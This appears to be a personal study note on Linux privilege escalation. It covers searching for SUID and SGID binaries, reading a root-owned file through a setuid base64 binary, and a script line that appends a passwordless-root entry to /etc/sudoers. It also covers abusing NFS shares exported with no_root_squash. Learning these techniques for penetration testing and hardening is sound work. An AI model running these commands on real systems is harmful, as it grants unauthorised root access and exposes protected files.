#Linux #Linux_PrivilegeEscalation #suid

- To find binaries with setuid set:
```plaintext
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20230624133330.png]]

**Example of exploiting suid**

Assume we have a file in `/root/escalated.txt` which is owned by the `root` used. Assume also that the `base64` binary is owned by the `root` user and has the `setuid` bit set. Then we can use the following command to read the `/root/escalated.txt` as a non root user:
`base64 /root/escalated.txt | base64 --decode`

#### SGID

To find the files on the system with the SGID set, we use the following command:
```plaintext
find / -perm -g=s -type f 2>/dev/null
```

Distinction between real user ID(who we really are) and effective user ID(what permissions we use) => When setuid is set, effective user id is set to the real user id of the owner of the file, and when the setgid is set, effective user id is set to the group id.


#### Services

- To add a user to the SUDOERS group, we use the following command:
```
#!/bin/bash
echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```


#### Mountable Shares

- To display the mount list that can be shared with a target host, we use the following command:
```
showmount -e [TARGET HOST IP]
```

Assume a root user mounts a remote file share on their local machine. Because of their local root privileges, the system will give the user root privileges over the files in the remote share.  In order to avoid this we set the `root_squash` option => the root local user will have the following options in the remote file shares:

![[Pasted image 20230624143654.png]]

=> If `no_root_squash` is set instead, we can create a folder with root permission locally, mount it to the shared fs and we will have root access to all the files the user put in this folder in the remote system.

To mount a local fs to a shared fs using NFS, we use the following command:
```plaintext
root@kali:~# mount -t nfs [Target IP]:/share /tmp/user
```


#### 
